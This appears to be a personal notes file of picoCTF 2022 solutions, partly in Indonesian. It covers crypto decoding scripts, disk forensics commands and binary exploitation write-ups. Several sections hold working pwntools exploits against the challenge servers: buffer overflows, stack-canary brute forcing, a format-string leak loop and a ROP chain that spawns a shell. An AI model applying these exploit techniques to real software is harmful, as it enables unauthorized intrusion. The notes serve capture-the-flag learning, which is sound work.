### basic-mod1
```python
enc = "91 322 57 124 40 406 272 147 239 285 353 272 77 110 296 262 299 323 255 337 150 102"
enc = [int(x) for x in enc.split()]
upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
print(len(upper))
number  = "0123456789"
print(len(number))
underscore = "_"
reg = upper + number + underscore
for i in enc:
    print(reg[i%37], end="")
```
### basic-mod2
```python
enc = "104 290 356 313 262 337 354 229 146 297 118 373 221 359 338 321 288 79 214 277 131 190 377"
enc = [int(x) for x in enc.split()]
Mod41 = []
for i in enc:
    Mod41.append(i % 41)
ModInv = [0] * len(Mod41)
# modular inverse of each number
for i in range(len(Mod41)):
    for j in range(41):
        if (Mod41[i] * j) % 41 == 1:
            ModInv[i] = j

print(ModInv)
upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
number  = "0123456789"
underscore = "_"
reg = underscore + upper + number
for i in ModInv:
    print(reg[i%37], end="")
```
```sh
$ chmod +x gdbme
$ gdb gdbme
(gdb) layout asm
(gdb) break *(main+99)
(gdb) run
(gdb) jump *(main+104)
(gdb) tui disable
```
### Search source
```sh
wget -r http://saturn.picoctf.net:61941
find / -type f -exec grep -H 'text-to-find-here' {} \;
```
### Sleuthkit Intro
```sh
mmls disk.img
```
### transposition-trial
```python
enc = "heTfl g as iicpCTo{7F4NRP051N5_16_35P3X51N3_V9AAB1F8}7"
dec = ""
for i in range(0,len(enc),3):
    try:
        dec += enc[i]
        dec += enc[i+1]
        dec += enc[i+5]
    except:
        pass
print(dec)
```
### buffer overflow 1
```sh
(sleep 2;echo -e "AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOO\xf6\x91\x04\x08";sleep 2) | nc saturn.picoctf.net 64864
```


```

```
### Fresh Java
use jd-gui
regex
```sh
cat decompile.txt | grep -Po "(?<=')(\w|\W)*(?=')" | tr -d "\n" | rev
```

### RPS
original: https://www.it-sec.fail/picoctf-2022-binary-exploitation-rps/
1.  Checking the code (as mentioned in the hint of the challenge)
    
2.  In the `play` function we can see, that the program uses the `strstr()` method to check who wins.  
    This is the line in the code
    
    ```c++
    if (strstr(player_turn, loses[computer_turn])) {
    ```
    
3.  This is the [manual](https://www.cplusplus.com/reference/cstring/strstr/) of the `strstr()` method.
    
    ```text
    str1
    C string to be scanned.
    str2
    C string containing the sequence of characters to match.
    ```
    
4.  If we send every possible anwser, we should always win 🙂
    
5.  So you should get the flag if you send: `rockscissorspaper`

```python
from pwn import *

# connect to the server
s = remote('saturn.picoctf.net', 56981)
for _ in range(6):
        print(s.recvuntil(b"exit the program"))
        print(s.sendline(b"1"))
        print(s.recvuntil(b"(rock/paper/scissors):"))
        print(s.sendline(b"rockpaperscissors"))

```
#### catatan
The _C_ library function long int _strtol_(const char *str, char endptr, int base) converts the initial part of the string in str to a long int value*
### Sleuthkit Apprentice
```sh
mmls disk.flag.img
```
out
```
DOS Partition Table  
Offset Sector: 0  
Units are in 512-byte sectors  
  
     Slot      Start        End          Length       Description  
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)  
001:  -------   0000000000   0000002047   0000002048   Unallocated  
002:  000:000   0000002048   0000206847   0000204800   Linux (0x83)  
003:  000:001   0000206848   0000360447   0000153600   Linux Swap / Solaris x86 (0x82)  
004:  000:002   0000360448   0000614399   0000253952   Linux (0x83)
```

```sh
fls -o 360448 disk.flag.img
```
out
```
d/d 451:        home  
d/d 11: lost+found  
d/d 12: boot  
d/d 1985:       etc  
d/d 1986:       proc  
d/d 1987:       dev  
d/d 1988:       tmp  
d/d 1989:       lib  
d/d 1990:       var  
d/d 3969:       usr  
d/d 3970:       bin  
d/d 1991:       sbin  
d/d 1992:       media  
d/d 1993:       mnt  
d/d 1994:       opt  
d/d 1995:       root  
d/d 1996:       run  
d/d 1997:       srv  
d/d 1998:       sys  
d/d 2358:       swap  
V/V 31745:      $OrphanFiles
```

```sh
fls -o 360448 disk.flag.img 1995
```
go to my_directory and you can find the flag
```sh
icat -o 360448 disk.flag.img 2371
```
### SQL Direct
```sh
\l # list of database
\d # list of relation
\d flags # table public.flag
SELECT * FROM flags; # show value
```


### x-sixty-what
sumber: https://prfalken.org/index.php/2022/03/29/picoctf-2022-x-sixty-what/
gets() Reads characters from the standard input (stdin) and stores them as a C string into str until a newline character or the end-of-file is reached. 

As suggested in the **2nd hint**, we **should try to jump** to the **instruction after the push**, instead of the first instruction of the function (believe me, if you jump on the first one, you’ll get weird segmentation faults).
The address we **want to jump** is then **0x40123b**
Also remember that in 64bits, registers are 8 bytes, and that we needed 64 bytes + 8 bytes to overwrite RBP.
But we want to overwrite the return address which right above in the stack, so we need : (64 + 8) bytes to fill the reserved space + 8 bytes for the address we want to jump to in little endian (000000003b1240).
```python
from pwn import *

p = remote('saturn.picoctf.net', 62617)


payload = b'A'*72 + b'\x3b\x12\x40\x00\x00\x00\x00\x00'

print(p.recvline().decode())
p.sendline(payload)
print(p.recv().decode())
```
### buffer overflow 2
Pertama kita akan menggenerate payload untuk mengubah EIP dari "main" agar nantinya return address dari main bisa *jump* ke address dari fungsi "jump"
```python
winAddress = 0x0804929a
ebx = b"AAAA"
ebp = b"AAAA"
eip = struct.pack('<I', winAddress)
payload = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"+ebx+ebp+eip
```

```sh
echo "flag{test}" > flag.txt
```

![](Pasted%20image%2020220424180717.png)
Dilihat dari fungsi "win" diata, bahwa flag masih belum bisa dilihat karena adanya if statement pada fungsi "win" yang menghalangi perintah "printf(buf);" untuk berjalan dan menampikan flag-nya.
Sekarang kita akan mencoba untuk men-disassemble fungsin "win".
```sh
disassemble win
```

```python
  0x0804930c <+118>:   cmp    DWORD PTR [ebp+0x8],0xcafef00d  
  0x08049313 <+125>:   jne    0x804932f <win+153>  
  0x08049315 <+127>:   cmp    DWORD PTR [ebp+0xc],0xf00df00d
```

"cmp" pada assembly di atas berfungsi untuk men-compare antara address ebp+0x8 dengan hex "0xcafef00d".
sama juga yang terjadi pada address "win+127", cmp mencompare address ebp+0xc dengan hex "0xf00df00d".

```python
import struct
from pwn import *

winAddress = 0x08049296

ebx = b"AAAA"
ebp = b"AAAA"

eip = struct.pack('<I', winAddress)
payload = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"+ebx+ebp+eip

ebpPlus0x8 = p32(0xcafef00d)
ebpPlus0xc = p32(0xf00df00d)
payload += b"AAAA"+ebpPlus0x8+ebpPlus0xc

p = process("/home/wowon/Downloads/vuln", stdout=process.PTY, stdin=process.PTY, stderr=process.PTY)
p = remote("saturn.picoctf.net", 50987)
# We receive the prompt with a new line
output = p.recvline()
print(output.decode())

# We send the payload and a newline
print("Sending payload")
p.sendline(payload)
print("Payload sent")

# We receive the output of the Win function
sleep(1)
output = p.recv()
print(output)
```


#### Referensi
https://musyokaian.medium.com/buffer-overflow-2-picoctf-2022-590cf7b7961f
### buffer overflow 3
```sh
objdump -M intel -S ./vuln
```
output:
```
vuln:
  push   ebp ; preserve ebp
  mov    ebp,esp ; ebp points at preserved ebp value
  sub    esp,0x58

  mov    DWORD PTR [ebp-0xc],0x0 ; x = 0
  
  mov    eax,ds:0x804a058
  mov    DWORD PTR [ebp-0x10],eax ; memcpy(canary,global_canary,CANARY_SIZE);

  ; ...
  mov    eax,DWORD PTR [ebp-0x54]
  sub    esp,0x4
  push   eax  ; count
  lea    eax,[ebp-0x30] ; buf
  push   eax
  push   0x0  ;  0
  call   80484f0 <read@plt> ; read(0,buf,count);
  add    esp,0x10
  ; ...
```

#### exploit
```sh
for i in {0..255}; do python -c "print('33\n' + 'A'*32 + chr($i))" | nc saturn.picoctf.net 52443 >/dev/null && echo "$i"; done
```

```python
from pwn import *
from colorama import Fore, Style

# Global variables
manyByte = 65
startByte = 64
winAddress = 0x8049336

# Turn on/off remote server
isRemote = False
if isRemote == True:
    remoteServer = remote('saturn.picoctf.net', 63971)

print(Fore.RED + '[picoCTF buffer overflow 3]' + Style.RESET_ALL, end='')

def tempFile(filename, content):
    try:
        os.remove(filename)
    except:
        pass
    with open(filename, 'w') as f:
        f.write(content)
    

def canarySendLine(charOrd, manyByte, canaryValue):
    global startByte, remoteServer
    vault = ''
    if isRemote == False:
        remoteServer = process('./vuln')
    try:
        with remoteServer as p:
            p.recvuntil(b'>');p.sendline(bytes(str(manyByte), 'utf-8')) 
            payload2 = 'A' * startByte + canaryValue + chr(charOrd)
            p.recvuntil(b'>');p.sendline(bytes(payload2, 'utf-8'))
            vault = p.recvline("\n").decode()
    except:
        print(Fore.RED + '['+ str(charOrd) +'] Connection error' + Style.RESET_ALL)
        pass
    return vault

def findCanary():
    global manyByte
    canaryValue = ''
    
    # print 'finding canary value' with green color
    print(Fore.GREEN + '[+] Finding canary value: ' + Style.RESET_ALL, end = '')
    for _ in range(4):
        for charOrd in range(255):
            # deactivate log
            context.log_level = 'error'
            # send line to the server
            vault = canarySendLine(charOrd, manyByte, canaryValue)
            if "Ok... Now Where's the Flag?" in vault:
                canaryValue += chr(charOrd)
                manyByte += 1
                print(canaryValue[-1], end='')
                break
            else:
                continue
    # write canary in file result.txt, and if result.txt exist, delete it
    tempFile('result.txt', canaryValue)
    return canaryValue

def exploit():
    global manyByte, winAddress, startByte, remoteServer
    
    # if result.txt exist, open it
    if os.path.isfile('result.txt'):
        with open('result.txt', 'r') as f:
            canary = f.read()
        print(Fore.GREEN + '\n[+] Canary value: ' + canary + Style.RESET_ALL, end='')
    else:
        canary = findCanary()

    manyByte += 4 + 16 + 4

    print(Fore.GREEN + '\n[+] Exploiting: ' + Style.RESET_ALL, end='')
    # deactivate log
    context.log_level = 'error'
    # check if remote server is false, if true, send line to the server
    if isRemote == False:
        remoteServer = process('./vuln')
    # send line to the server
    with remoteServer as p:
        p.recvuntil(b'>');p.sendline(bytes(str(manyByte), 'utf-8')) 
        payload2 = bytes('A' * startByte + canary + "A"*16, 'utf-8') + p32(winAddress)
        print(Fore.GREEN + '\n[+] Payload: ' + str(payload2) + Style.RESET_ALL)
        p.recvuntil(b'>');p.sendline(payload2)
        print(p.interactive())
    
if __name__ == '__main__':
    exploit()
```

#### Referensi
https://www.nullhardware.com/reference/hacking-101/picoctf-2018-binary-exploits/buffer-overflow-3/
https://github.com/Dvd848/CTFs/blob/master/2018_picoCTF/buffer%20overflow%203.md

### Eavesdrop

```sh
openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123
echo 53616c7465645f5fbf1f3543c1437d489ac5c700f4809146799c9d503b551476a3f06159293bee7c9e5183fb5c4a184c | xxd -r -p
```

```sh
echo 53616c7465645f5fbf1f3543c1437d489ac5c700f4809146799c9d503b551476a3f06159293bee7c9e5183fb5c4a184c | xxd -r -p | openssl des3 -d -salt -k supersecretpassword123
```

### flag leak
```sh
for _ in {1..127}
do
    python3 -c "print('%x'*$_+'%s')" | nc saturn.picoctf.net 50797 >> result.txt && echo -e "$_\n" >> result.txt
done
```


### Operation Oni
```sh
for i in {1..10000}
do
    echo $i >> result.txt
    ffind -o 206848 disk.img $i >> result.txt
done
```

```sh
fls -o 206848 disk.img 3916
icat -o 206848 disk.img 2345 > key_file
chmod 600 key_file
ssh -i key_file -p 50786 ctf-player@saturn.picoctf.net
```
### ropfu
```sh
ROPgadget --binary ./vuln --ropchain
```

```sh
from struct import pack
from pwn import process, remote

p = b'A'*28

p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5064) # @ .data + 4
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x08049e39) # pop ecx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080e5060) # padding without overwrite ebx
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0804a3d2) # int 0x80


sh = remote('saturn.picoctf.net', 49895)
#sh = process('/home/wowon/Downloads/vuln')
print(sh.recvline(1000))
sh.send(p)
sh.interactive()
sh.close()
```

#### Usefull writeup
https://github.com/evyatar9/Writeups/tree/master/CTFs/2022-picoCTF2022/Binary_Exploitation/300-ropfu
### unpackme
```sh
upx -d unpackme-upx
ida64 unpackme-upx
```
![](Pasted%20image%2020220511214710.png)
### Operation Orchid
```sh
fls -o 411648 disk.flag.img
fls -o 411648 disk.flag.img 472
icat -o 411648 disk.flag.img 1782 > flag.txt.enc
```

```sh
openssl aes-256-cbc -d -in flag.txt.enc -out flag.txt -k unbreakable  
password1234567
```